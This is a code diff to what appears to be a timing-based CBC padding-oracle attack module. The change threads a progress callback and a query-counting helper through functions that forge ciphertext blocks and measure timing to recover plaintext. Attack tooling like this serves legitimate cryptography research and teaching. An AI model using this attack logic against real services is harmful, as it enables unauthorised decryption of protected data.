@@ -6,9 +6,12 @@ refinement logic into shared helpers so the flow stays compact and readable.
 
 from dataclasses import dataclass
 import math
+from typing import Callable
 
 from .. import crypto
 from .common import AttackError, TimingOracle
+
+ProgressCallback = Callable[[int], None]
 
 
 @dataclass
@@ -63,6 +66,7 @@ def recover_block_timing(
     oracle: TimingOracle,
     config: TimingConfig,
     prefix: bytes = b"",
+    progress_callback: ProgressCallback | None = None,
 ) -> tuple[bytes, int]:
     """Recover one plaintext block from timing leakage."""
     cfg = config.normalized()
@@ -91,7 +95,7 @@ def recover_block_timing(
             candidate_prev[pos] = guess
             forged = prefix_bytes + bytes(candidate_prev) + curr
             total, total_sq = _sample_stats_ns(oracle, forged, cfg.initial_samples)
-            queries += cfg.initial_samples
+            queries = _add_queries(queries, cfg.initial_samples, progress_callback)
             byte_queries += cfg.initial_samples
             scores.append(
                 Score(
@@ -113,7 +117,7 @@ def recover_block_timing(
             refine_samples=cfg.refine_samples,
             remaining_budget=cfg.max_queries_per_byte - byte_queries,
         )
-        queries += consumed
+        queries = _add_queries(queries, consumed, progress_callback)
         byte_queries += consumed
 
         # Refine top-k until top-1 beats top-2 with confidence or budget ends.
@@ -123,7 +127,7 @@ def recover_block_timing(
             cfg,
             remaining_budget=cfg.max_queries_per_byte - byte_queries,
         )
-        queries += consumed
+        queries = _add_queries(queries, consumed, progress_callback)
         byte_queries += consumed
 
         # Final focused refinement on current top-2 only, re-evaluated each round.
@@ -140,7 +144,7 @@ def recover_block_timing(
                 refine_samples=cfg.refine_samples,
                 remaining_budget=cfg.max_queries_per_byte - byte_queries,
             )
-            queries += consumed
+            queries = _add_queries(queries, consumed, progress_callback)
             byte_queries += consumed
             if consumed == 0:
                 break
@@ -159,7 +163,7 @@ def recover_block_timing(
                         prefix_len=len(prefix_bytes),
                         probe_samples=probe_samples,
                     )
-                    queries += extra_queries
+                    queries = _add_queries(queries, extra_queries, progress_callback)
                     byte_queries += extra_queries
 
         intermediate[pos] = best_guess ^ pad
@@ -173,6 +177,7 @@ def recover_ciphertext_block_timing(
     block_index: int,
     oracle: TimingOracle,
     config: TimingConfig,
+    progress_callback: ProgressCallback | None = None,
 ) -> tuple[bytes, int]:
     """Recover one plaintext block from a full ciphertext by index."""
     if len(ciphertext) < 2 * crypto.BLOCK_SIZE or len(ciphertext) % crypto.BLOCK_SIZE != 0:
@@ -189,13 +194,21 @@ def recover_ciphertext_block_timing(
     prefix = ciphertext[:prev_start]
     prev = ciphertext[prev_start:prev_end]
     curr = ciphertext[prev_end:curr_end]
-    return recover_block_timing(prev, curr, oracle, config, prefix=prefix)
+    return recover_block_timing(
+        prev,
+        curr,
+        oracle,
+        config,
+        prefix=prefix,
+        progress_callback=progress_callback,
+    )
 
 
 def recover_plaintext_timing(
     ciphertext: bytes,
     oracle: TimingOracle,
     config: TimingConfig,
+    progress_callback: ProgressCallback | None = None,
 ) -> tuple[bytes, int]:
     """Recover all plaintext blocks without stripping PKCS#7 padding."""
     if len(ciphertext) < 2 * crypto.BLOCK_SIZE or len(ciphertext) % crypto.BLOCK_SIZE != 0:
@@ -206,11 +219,16 @@ def recover_plaintext_timing(
     total_queries = 0
 
     for block_index in range(num_blocks - 1, 0, -1):
+        def block_progress(block_queries: int) -> None:
+            if progress_callback is not None:
+                progress_callback(total_queries + block_queries)
+
         block, queries = recover_ciphertext_block_timing(
             ciphertext,
             block_index,
             oracle,
             config,
+            progress_callback=block_progress,
         )
         recovered_blocks[block_index] = block
         total_queries += queries
@@ -323,3 +341,17 @@ def _resolve_last_byte_ambiguity(
             best_guess = candidate.guess
 
     return best_guess, queries
+
+
+def _add_queries(
+    current_queries: int,
+    delta: int,
+    progress_callback: ProgressCallback | None,
+) -> int:
+    """Increase query count and emit progress callback if configured."""
+    if delta <= 0:
+        return current_queries
+    updated = current_queries + delta
+    if progress_callback is not None:
+        progress_callback(updated)
+    return updated
